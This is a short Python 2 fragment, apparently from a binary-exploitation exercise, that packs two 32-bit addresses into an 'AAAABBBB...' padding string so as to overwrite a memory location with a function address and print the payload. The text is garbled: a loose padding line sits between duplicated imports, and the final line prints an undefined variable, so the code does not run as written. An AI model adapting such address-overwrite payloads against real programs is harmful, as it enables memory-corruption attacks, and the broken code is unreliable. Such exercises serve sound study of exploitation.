import struct

AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP ZZZZ

import struct

m_address = struct.pack("I", 0x80484f4)
to_replace = struct.pack("I", 0x8049928)
padding = "AAAABBBBCCCCDDDDEEEE"+ to_replace + "GGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP" + " "+ m_address
print padding + target_address